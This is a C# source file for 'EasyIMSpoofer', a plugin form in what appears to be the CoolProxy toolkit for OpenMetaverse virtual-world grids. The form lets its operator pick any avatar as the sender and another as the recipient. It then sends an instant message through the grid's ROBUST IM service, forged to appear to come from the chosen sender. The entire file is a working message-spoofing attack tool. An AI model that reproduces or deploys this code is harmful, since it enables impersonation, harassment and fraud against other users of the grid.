using OpenMetaverse;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace CoolProxy.Plugins.GridIMHacks
{
    public partial class EasyIMSpoofer : Form
    {
        private CoolProxyFrame Proxy;

        private UUID SenderID = UUID.Zero;
        private UUID RecipientID = UUID.Zero;

        public EasyIMSpoofer(CoolProxyFrame frame)
        {
            Proxy = frame;
            InitializeComponent();
        }

        private void setTargetButton_Click(object sender, EventArgs e)
        {
            using(AvatarPickerSearchForm picker = new AvatarPickerSearchForm())
            {
                if(picker.ShowDialog() == DialogResult.OK)
                {
                    SenderID = picker.SelectedID;
                    targetAgentName.Text = picker.SelectedName;
                }
            }
        }

        private void setRecipientButton_Click(object sender, EventArgs e)
        {
            using (AvatarPickerSearchForm picker = new AvatarPickerSearchForm())
            {
                if (picker.ShowDialog() == DialogResult.OK)
                {
                    RecipientID = picker.SelectedID;
                    recipientAgentName.Text = picker.SelectedName;
                }
            }
        }

        private void sendMessageButton_Click(object sender, EventArgs e)
        {
            UUID session_id = SenderID ^ RecipientID;
            GridIMHacksPlugin.ROBUST.IM.SendGridIM(SenderID, "", RecipientID, InstantMessageDialog.MessageFromAgent, false, textBox1.Text, session_id, false, Vector3.Zero, UUID.Zero, 0, new byte[0], Utils.GetUnixTime());
        }
    }
}
